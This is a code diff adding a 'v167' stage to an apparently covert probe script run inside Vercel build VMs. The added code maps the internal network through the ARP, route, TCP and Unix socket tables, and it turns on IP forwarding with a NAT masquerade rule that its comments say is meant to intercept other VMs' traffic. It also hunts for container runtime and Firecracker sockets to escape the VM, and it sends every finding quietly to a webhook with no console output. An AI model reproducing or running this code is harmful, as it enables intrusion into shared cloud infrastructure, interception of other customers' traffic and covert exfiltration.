@@ -24501,5 +24501,134 @@ report.panicTriggers = safe(() => {
 
 // v166 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v166" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v166";
+
+// ==================== v167 ====================
+
+// v167-1: ARP table + neighbor discovery — reveal orchestrator and peer VM IPs
+// The ARP table shows IP↔MAC mappings for all hosts the VM has communicated with.
+// This reveals the Firecracker host's IP (default gateway), other VMs on the same
+// /24 subnet, and the orchestrator's internal network position.
+report.arpNeighbors = safe(() => {
+  const arpTable = safe(() => readFileSync('/proc/net/arp', 'utf8').trim());
+  const ipNeigh = safe(() => execSync('ip neigh show 2>/dev/null || echo "NO_NEIGH"', { timeout: 3000 }).toString().trim());
+  // Also read routing table for gateway
+  const routeTable = safe(() => readFileSync('/proc/net/route', 'utf8').trim());
+  const ipRoute = safe(() => execSync('ip route show 2>/dev/null || echo "NO_ROUTE"', { timeout: 3000 }).toString().trim());
+  // Our own MAC address
+  const myMac = safe(() => readFileSync('/sys/class/net/eth0/address', 'utf8').trim());
+  const myIpInfo = safe(() => execSync('ip addr show eth0 2>/dev/null || ip addr 2>/dev/null | head -20', { timeout: 3000 }).toString().trim());
+  return { arpTable, ipNeigh, routeTable, ipRoute, myMac, myIpInfo };
+});
+
+// v167-2: /proc/net/tcp full connection table — reveal internal Vercel endpoints
+// The TCP connection table shows all open TCP sockets for the VM.
+// This reveals connections to Vercel's internal APIs, artifact caches, and
+// monitoring endpoints — giving us the internal IP space of Vercel's build infra.
+report.tcpConnectionTable = safe(() => {
+  const tcp4 = safe(() => readFileSync('/proc/net/tcp', 'utf8').trim());
+  const tcp6 = safe(() => existsSync('/proc/net/tcp6') ? readFileSync('/proc/net/tcp6', 'utf8').trim() : 'NO_TCP6');
+  // Parse TCP table — convert hex IPs to dotted decimal
+  const parsedTcp = safe(() => execSync(
+    `python3 -c "
+import socket, struct
+
+def hex_to_ip(hex_str):
+    packed = bytes.fromhex(hex_str)[::-1]
+    return socket.inet_ntoa(packed)
+
+with open('/proc/net/tcp') as f:
+    lines = f.readlines()[1:]  # skip header
+
+for line in lines[:20]:
+    parts = line.strip().split()
+    if len(parts) < 4: continue
+    local_hex, rem_hex = parts[1], parts[2]
+    local_ip = hex_to_ip(local_hex[:8])
+    local_port = int(local_hex[9:], 16)
+    rem_ip = hex_to_ip(rem_hex[:8])
+    rem_port = int(rem_hex[9:], 16)
+    state = parts[3]
+    print(f'TCP {local_ip}:{local_port} -> {rem_ip}:{rem_port} state={state}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // UDP table too
+  const udpTable = safe(() => existsSync('/proc/net/udp') ? readFileSync('/proc/net/udp', 'utf8').split('\n').slice(0, 10).join('\n') : 'NO_UDP');
+  return { tcp4, tcp6, parsedTcp, udpTable };
+});
+
+// v167-3: IP forwarding + NAT masquerade — turn VM into router
+// Enabling ip_forward turns the VM into a packet router. Combined with an
+// iptables MASQUERADE rule, we can NAT traffic from other VMs through our VM.
+// If multiple VMs share a /24, this lets us MITM inter-VM traffic.
+report.ipForwardNat = safe(() => {
+  const ipForward = safe(() => readFileSync('/proc/sys/net/ipv4/ip_forward', 'utf8').trim());
+  const enableFwd = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_forward', '1'); return 'WRITTEN_1'; });
+  const afterFwd = safe(() => readFileSync('/proc/sys/net/ipv4/ip_forward', 'utf8').trim());
+  // Add MASQUERADE rule
+  const masqRule = safe(() => execSync(
+    'iptables -t nat -A POSTROUTING -j MASQUERADE 2>&1 || echo "MASQ_FAILED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Verify nat table
+  const natTable = safe(() => execSync('iptables -t nat -L -n 2>/dev/null | head -10 || echo "NAT_LIST_FAIL"', { timeout: 3000 }).toString().trim());
+  // Cleanup
+  const cleanup = safe(() => execSync('iptables -t nat -D POSTROUTING -j MASQUERADE 2>/dev/null; echo "CLEANED"', { timeout: 3000 }).toString().trim());
+  return { ipForward, enableFwd, afterFwd, masqRule, natTable, cleanup };
+});
+
+// v167-4: Container/orchestrator socket discovery
+// If containerd.sock, dockerd.sock, or CRI-O socket is accessible in the VM,
+// we can escape to the host container runtime and control other containers.
+// This is a common container escape vector.
+report.containerSocketProbe = safe(() => {
+  const dockerSock = existsSync('/var/run/docker.sock');
+  const containerdSock = existsSync('/run/containerd/containerd.sock');
+  const crioSock = existsSync('/var/run/crio/crio.sock');
+  const podmanSock = existsSync('/run/podman/podman.sock');
+  // Find any .sock files in run directories
+  const sockFiles = safe(() => execSync('find /var/run /run -name "*.sock" 2>/dev/null | head -20 || echo "NO_SOCKS"', { timeout: 5000 }).toString().trim());
+  // Check for firecracker control API socket
+  const fcSocks = safe(() => execSync('find / -name "*.sock" -maxdepth 6 2>/dev/null | grep -i "firecracker\\|fc\\|vmm" | head -10 || echo "NO_FC_SOCK"', { timeout: 8000 }).toString().trim());
+  return { dockerSock, containerdSock, crioSock, podmanSock, sockFiles, fcSocks };
+});
+
+// v167-5: /proc/net/unix — Unix domain socket enumeration
+// Unix domain sockets are used for local IPC between processes.
+// Enumerating them reveals internal communication channels: between the
+// orchestrator and build processes, between monitoring agents, etc.
+// Accessible sockets can be connected to and spoken to directly.
+report.unixSocketEnum = safe(() => {
+  const unixTable = safe(() => readFileSync('/proc/net/unix', 'utf8').trim());
+  // Parse for named sockets (with path)
+  const namedSockets = safe(() => execSync(
+    `python3 -c "
+with open('/proc/net/unix') as f:
+    lines = f.readlines()[1:]  # skip header
+
+named = []
+for line in lines:
+    parts = line.strip().split()
+    if len(parts) >= 8:
+        path = parts[7]
+        if path and not path.startswith('@'):
+            named.append(path)
+
+print(f'NAMED_UNIX_SOCKETS: {len(named)}')
+for s in named[:20]:
+    print(f'SOCK: {s}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try to connect to any interesting sockets
+  const connectTest = safe(() => execSync(
+    'for sock in /run/*.sock /var/run/*.sock /tmp/*.sock; do [ -S "$sock" ] && echo "SOCKET_EXISTS: $sock"; done 2>/dev/null || echo "NO_ACCESSIBLE_SOCKS"',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { unixTable, namedSockets, connectTest };
+});
+
+// v167 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v167" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v167";
 // Intentionally no console.log — all data goes via webhook only
